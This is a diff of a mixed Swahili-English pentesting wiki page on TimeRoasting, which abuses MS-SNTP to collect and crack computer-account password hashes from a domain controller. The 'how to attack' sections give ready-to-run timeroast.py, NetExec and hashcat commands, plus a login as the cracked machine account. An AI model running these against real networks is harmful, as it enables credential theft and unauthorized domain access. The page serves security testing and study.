@@ -2,39 +2,58 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-timeRoasting, sababu kuu ni mfumo wa uthibitishaji wa zamani uliowachwa na Microsoft katika nyongeza yake kwa seva za NTP, inayojulikana kama MS-SNTP. Katika mfumo huu, wateja wanaweza kutumia moja kwa moja Kitambulisho cha Uhusiano (RID) cha akaunti yoyote ya kompyuta, na kidhibiti cha eneo litatumia hash ya NTLM ya akaunti ya kompyuta (iliyoundwa na MD4) kama ufunguo wa kuunda **Nambari ya Uthibitishaji wa Ujumbe (MAC)** ya pakiti ya majibu.
+TimeRoasting inatumia upanuzi wa zamani wa uthibitishaji wa MS-SNTP. Katika MS-SNTP, client inaweza kutuma ombi la byte 68 linalojumuisha RID yoyote ya akaunti ya kompyuta; domain controller hutumia hash ya NTLM ya akaunti ya kompyuta (MD4) kama ufunguo kuhesabu MAC juu ya jibu na kuirudisha. Washambulizi wanaweza kukusanya MAC hizi za MS-SNTP bila uthibitisho na kuzivunja offline (Hashcat mode 31300) ili kupata nywila za akaunti za kompyuta.
 
-Wavamizi wanaweza kutumia mfumo huu kupata thamani sawa za hash za akaunti za kompyuta bila uthibitishaji. Kwa wazi, tunaweza kutumia zana kama Hashcat kwa ajili ya brute-forcing.
-
-Mfumo maalum unaweza kuonekana katika sehemu 3.1.5.1 "Tabia ya Ombi la Uthibitishaji" ya [nyaraka rasmi za Windows kwa itifaki ya MS-SNTP](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf).
-
-Katika hati hiyo, sehemu 3.1.5.1 inashughulikia Tabia ya Ombi la Uthibitishaji.
+Tazama sehemu 3.1.5.1 "Authentication Request Behavior" na 4 "Protocol Examples" katika spec rasmi ya MS-SNTP kwa maelezo.
 ![](../../images/Pasted%20image%2020250709114508.png)
-Inaweza kuonekana kwamba wakati kipengele cha ExtendedAuthenticatorSupported ADM kimewekwa kuwa `false`, muundo wa asili wa Markdown unahifadhiwa.
+When the ExtendedAuthenticatorSupported ADM element is false, the client sends a 68-byte request and embeds the RID in the least significant 31 bits of the Key Identifier subfield of the authenticator.
 
->Quoted in the original article：
->>Ikiwa kipengele cha ExtendedAuthenticatorSupported ADM ni false, mteja LAZIMA aunde ujumbe wa Ombi la NTP la Mteja. Urefu wa ujumbe wa Ombi la NTP la Mteja ni byte 68. Mteja anapanga uwanja wa Authenticator wa ujumbe wa Ombi la NTP la Mteja kama ilivyoelezwa katika sehemu 2.2.1, akiandika bits 31 za chini za thamani ya RID katika bits 31 za chini za uwanja wa Kitambulisho cha Ufunguo wa authenticator, na kisha akiandika thamani ya Mchaguzi wa Ufunguzi katika bit ya juu zaidi ya uwanja wa Kitambulisho cha Ufunguzi.
+> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.
 
-Katika sehemu ya hati 4 Mifano ya Itifaki pointi 3
+From section 4 (Protocol Examples):
 
->Quoted in the original article：
->>3. Baada ya kupokea ombi, seva inathibitisha kwamba saizi ya ujumbe ulipokelewa ni byte 68. Ikiwa si hivyo, seva inatupa ombi (ikiwa saizi ya ujumbe haiwiani na byte 48) au inachukulia kama ombi lisilo na uthibitisho (ikiwa saizi ya ujumbe ni byte 48). Ikiwa tunadhania kwamba saizi ya ujumbe ulipokelewa ni byte 68, seva inachukua RID kutoka kwa ujumbe ulipokelewa. Seva inaitumia kuita njia ya NetrLogonComputeServerDigest (kama ilivyoainishwa katika [MS-NRPC] sehemu 3.5.4.8.2) ili kuhesabu crypto-checksums na kuchagua crypto-checksum kulingana na bit ya juu zaidi ya uwanja wa Kitambulisho cha Ufunguzi kutoka kwa ujumbe ulipokelewa, kama ilivyoainishwa katika sehemu 3.2.5. Seva kisha inatuma jibu kwa mteja, ikipanga uwanja wa Kitambulisho cha Ufunguzi kuwa 0 na uwanja wa Crypto-Checksum kuwa crypto-checksum iliyohesabiwa.
+> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.
 
-Kulingana na maelezo katika hati rasmi ya Microsoft hapo juu, watumiaji hawahitaji uthibitishaji wowote; wanahitaji tu kujaza RID ili kuanzisha ombi, na kisha wanaweza kupata crypto-checksum. Crypto-checksum inaelezewa katika sehemu 3.2.5.1.1 ya hati.
+The crypto-checksum inategemea MD5 (tazama 3.2.5.1.1) na inaweza kuvunjwa offline, ikiruhusu the roasting attack.
 
->Quoted in the original article：
->>Seva inapata RID kutoka bits 31 za chini za uwanja wa Kitambulisho cha Ufunguzi wa ujumbe wa Ombi la NTP la Mteja. Seva inatumia njia ya NetrLogonComputeServerDigest (kama ilivyoainishwa katika [MS-NRPC] sehemu 3.5.4.8.2) ili kuhesabu crypto-checksums kwa vigezo vifuatavyo:
->>>![](../../images/Pasted%20image%2020250709115757.png)
+## Jinsi ya Kushambulia
 
-Crypto-checksum inahesabiwa kwa kutumia MD5, na mchakato maalum unaweza kutazamwa katika maudhui ya hati. Hii inatupa fursa ya kufanya shambulio la roasting.
-
-## jinsi ya kushambulia
-
-Quote to https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-roasting-timeroasting/
-
-[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort
-```
+[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Scripts za Timeroasting zilizotengenezwa na Tom Tervoort
+```bash
 sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
 hashcat -m 31300 ntp-hashes.txt
 ```
+---
+
+## Shambulio la vitendo (bila uthibitisho) na NetExec + Hashcat
+
+- NetExec inaweza kuorodhesha na kukusanya MS-SNTP MACs kwa computer RIDs bila uthibitisho na kuchapisha $sntp-ms$ hashes ziko tayari kwa cracking:
+```bash
+# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
+netexec smb <dc_fqdn_or_ip> -M timeroast
+# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
+```
+- Crack offline kwa Hashcat mode 31300 (MS-SNTP MAC):
+```bash
+hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
+# or let recent hashcat auto-detect; keep RIDs with --username for convenience
+```
+- Matini wazi iliyopatikana inalingana na nenosiri la akaunti ya kompyuta. Jaribu moja kwa moja kama akaunti ya mashine ukitumia Kerberos (-k) wakati NTLM imezimwa:
+```bash
+# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
+netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
+```
+Vidokezo vya uendeshaji
+- Hakikisha usawazishaji wa wakati uko sahihi kabla ya Kerberos: `sudo ntpdate <dc_fqdn>`
+- Iwapo inahitajika, tengeneza krb5.conf kwa AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
+- Fanya ramani ya RIDs kwa principals baadaye kupitia LDAP/BloodHound mara tu unapopata authenticated foothold.
+
+## Marejeleo
+
+- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
+- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
+- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
+- [NetExec – official docs](https://www.netexec.wiki/)
+- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
 {{#include ../../banners/hacktricks-training.md}}
